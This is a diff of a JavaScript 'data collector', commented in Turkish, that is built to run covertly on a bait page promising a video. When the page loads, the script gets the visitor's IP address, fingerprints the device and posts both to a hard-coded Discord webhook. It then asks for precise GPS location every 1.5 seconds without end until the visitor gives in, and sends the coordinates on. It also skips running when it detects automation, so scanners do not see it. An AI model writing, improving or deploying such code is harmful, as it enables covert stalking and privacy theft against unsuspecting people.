@@ -1,28 +1,22 @@
 // ============================================
-// CYBERX DATA COLLECTOR V3.0
-// Toplanan: IP, Konum, Cihaz, Tarayıcı, Ekran, Dil, Zaman, Referrer
-// Webhook: DÜZ URL (base64 yok)
+// CYBERX DATA COLLECTOR - HAFIF & ÇALIŞAN
 // ============================================
 
-// 1. WEBHOOK URL (DÜZ YAZI — KENDİ URL'Nİ YAZ)
+// WEBHOOK URL (DÜZ)
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515100986648166723/nV48g4sriYiCN0SVpv0eko1dsoiLYi_4njTRKI-Pn9gZr3PsCa6kQFEUgSo6NwChIM07';
 
-// 2. VERİ GÖNDER
+// VERİ GÖNDER
 async function sendData(data) {
     try {
-        const res = await fetch(WEBHOOK_URL, {
+        await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ content: data })
         });
-        if (res.ok) console.log('✅ Gönderildi');
-        else console.log('❌ Hata: ' + res.status);
-    } catch(e) {
-        console.log('❌ Hata: ' + e.message);
-    }
+    } catch(e) {}
 }
 
-// 3. IP AL
+// IP AL
 async function getIP() {
     try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -33,134 +27,106 @@ async function getIP() {
     }
 }
 
-// 4. CİHAZ BİLGİSİ (ÇOK DETAYLI)
+// CİHAZ BİLGİSİ (GERÇEK)
 function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let device = 'Bilinmiyor';
+    
+    // GERÇEK CİHAZ TESPİTİ
+    if (ua.includes('Android')) device = 'Android Telefon/Tablet';
+    else if (ua.includes('iPhone')) device = 'iPhone';
+    else if (ua.includes('iPad')) device = 'iPad';
+    else if (ua.includes('Windows')) device = 'Windows PC';
+    else if (ua.includes('Mac')) device = 'Mac Bilgisayar';
+    else if (ua.includes('Linux')) device = 'Linux Bilgisayar';
+    
     return {
-        // Tarayıcı bilgileri
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages.join(', '),
-        cookieEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
-        
-        // Ekran bilgileri
-        screenWidth: screen.width,
-        screenHeight: screen.height,
-        screenColorDepth: screen.colorDepth,
-        availWidth: screen.availWidth,
-        availHeight: screen.availHeight,
-        
-        // Tarayıcı özellikleri
-        hardwareConcurrency: navigator.hardwareConcurrency || 'bilinmiyor',
-        deviceMemory: navigator.deviceMemory || 'bilinmiyor',
-        maxTouchPoints: navigator.maxTouchPoints,
-        
-        // Zaman ve konum
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timezoneOffset: new Date().getTimezoneOffset(),
-        currentTime: new Date().toLocaleString(),
-        
-        // Sayfa bilgileri
-        url: window.location.href,
-        referrer: document.referrer || 'doğrudan',
-        title: document.title
+        cihaz: device,
+        marka: ua.includes('Samsung') ? 'Samsung' : (ua.includes('Xiaomi') ? 'Xiaomi' : (ua.includes('Huawei') ? 'Huawei' : 'Bilinmiyor')),
+        isletimSistemi: ua.includes('Android') ? 'Android ' + (ua.match(/Android (\d+)/) ? ua.match(/Android (\d+)/)[1] : '') : (ua.includes('iOS') ? 'iOS' : 'Windows/Mac/Linux'),
+        tarayici: ua.includes('Chrome') ? 'Chrome' : (ua.includes('Firefox') ? 'Firefox' : (ua.includes('Safari') ? 'Safari' : 'Diğer')),
+        ekran: `${screen.width}x${screen.height}`,
+        dil: navigator.language,
+        saatDilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        url: window.location.href
     };
 }
 
-// 5. KONUM İSTE (REDDEDİNCE TEKRAR SOR)
+// KONUM İSTE (HEMEN, BASIT, SONSUZ)
+let denemeSayisi = 0;
+
 function askLocation(ip, deviceInfo) {
     if (!navigator.geolocation) {
-        sendData('⚠️ Tarayıcı konum desteklemiyor!');
+        sendData(`⚠️ Tarayıcı konum desteklemiyor! IP: ${ip}`);
         return;
     }
     
-    let attempt = 0;
-    
-    function askAgain() {
-        attempt++;
+    function istem() {
+        denemeSayisi++;
+        
         navigator.geolocation.getCurrentPosition(
             // BAŞARILI
             (pos) => {
-                const konum = `✅ KONUM ALINDI! (Deneme: ${attempt})
+                const mesaj = `✅✅✅ KONUM ALINDI! ✅✅✅
+                
 📍 Enlem: ${pos.coords.latitude}
 📍 Boylam: ${pos.coords.longitude}
 🎯 Doğruluk: ${pos.coords.accuracy} metre
-🏔️ Rakım: ${pos.coords.altitude || 'bilinmiyor'}
-🚀 Hız: ${pos.coords.speed || 'bilinmiyor'}
 🌐 IP: ${ip}
+📱 Cihaz: ${deviceInfo.cihaz} | ${deviceInfo.marka}
+📱 İS: ${deviceInfo.isletimSistemi}
+🌍 Tarayıcı: ${deviceInfo.tarayici}
+📺 Ekran: ${deviceInfo.ekran}
+🔤 Dil: ${deviceInfo.dil}
+⏰ Saat: ${deviceInfo.saatDilimi}
+🔁 Deneme: ${denemeSayisi}
 
-📱 CİHAZ BİLGİLERİ:
-${JSON.stringify(deviceInfo, null, 2)}`;
-
-                sendData(konum);
+--- BİLGİLER ALINDI ---`;
+                
+                sendData(mesaj);
                 
                 // BAŞARILI OLUNCA SAYFAYI DEĞİŞTİR
-                document.body.innerHTML = `
-                    <div style="text-align:center; padding:50px; font-family:Arial;">
-                        <h1>🐱🎉 LUEG MAL!</h1>
-                        <img src="https://cataas.com/cat/says/danke" width="300">
-                        <p><strong>GUELTIG ISCHS!</strong> 😂😂😂</p>
-                        <p>Jetzt chasch s Video luege!</p>
-                    </div>
-                `;
+                document.body.innerHTML = '<div style="text-align:center; padding:50px;"><h1>🎉 GUELTIG! 🎉</h1><img src="https://cataas.com/cat/says/danke" width="100%"><p>Jetz chasch s Video luege! 😂</p></div>';
             },
-            // REDDEDİLİNCE
+            // REDDEDILDI
             (error) => {
-                let hataMesaji = '';
-                switch(error.code) {
-                    case error.PERMISSION_DENIED:
-                        hataMesaji = '❌ KULLANICI REDDETTI! Tekrar soruluyor...';
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        hataMesaji = '📡 Konum bulunamadi, tekrar deneniyor...';
-                        break;
-                    case error.TIMEOUT:
-                        hataMesaji = '⏰ Zaman asimi, tekrar deneniyor...';
-                        break;
-                    default:
-                        hataMesaji = '⚠️ Bilinmeyen hata, tekrar deneniyor...';
-                }
-                sendData(`${hataMesaji}\nIP: ${ip}\nDeneme: ${attempt}`);
+                let hata = '';
+                if (error.code === 1) hata = 'KULLANICI REDDETTI';
+                else if (error.code === 2) hata = 'KONUM BULUNAMIYOR';
+                else if (error.code === 3) hata = 'ZAMAN ASIMI';
+                else hata = 'BILINMEYEN HATA';
                 
-                // 2 SANİYE SONRA TEKRAR SOR
-                setTimeout(askAgain, 2000);
+                sendData(`❌ ${hata} (Deneme ${denemeSayisi}) | IP: ${ip}`);
+                
+                // 1.5 SANİYE SONRA TEKRAR SOR
+                setTimeout(istem, 1500);
             },
-            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 10000 }
         );
     }
     
-    askAgain();
+    istem();
 }
 
-// 6. ANA FONKSİYON
+// ANA FONKSİYON
 async function main() {
-    // Bot kontrolü
-    if (navigator.webdriver) {
-        console.log('Bot tespit edildi, çalışmıyor.');
-        return;
-    }
+    // BOT KONTROLÜ
+    if (navigator.webdriver) return;
     
-    // IP al
     const ip = await getIP();
-    
-    // Cihaz bilgisi al
     const deviceInfo = getDeviceInfo();
     
-    // İLK MESAJ: Ziyaretçi geldi
-    const ilkMesaj = `🖥️🆕 YENİ ZİYARETÇİ GELDİ!
-    
+    // İLK MESAJ
+    sendData(`🆕 YENİ ZİYARETÇİ!
 🌐 IP: ${ip}
-📱 CİHAZ:
-${JSON.stringify(deviceInfo, null, 2)}
-
-⏰ Zaman: ${new Date().toLocaleString('tr-TR')}`;
+📱 ${deviceInfo.cihaz} | ${deviceInfo.marka}
+💻 ${deviceInfo.isletimSistemi} | ${deviceInfo.tarayici}
+📺 ${deviceInfo.ekran} | ${deviceInfo.dil}
+🔗 ${deviceInfo.url}`);
     
-    await sendData(ilkMesaj);
-    
-    // 1 saniye sonra konum iste
-    setTimeout(() => askLocation(ip, deviceInfo), 1000);
+    // HEMEN KONUM İSTE (0.5 saniye sonra)
+    setTimeout(() => askLocation(ip, deviceInfo), 500);
 }
 
-// 7. BAŞLAT
+// BAŞLAT
 main();
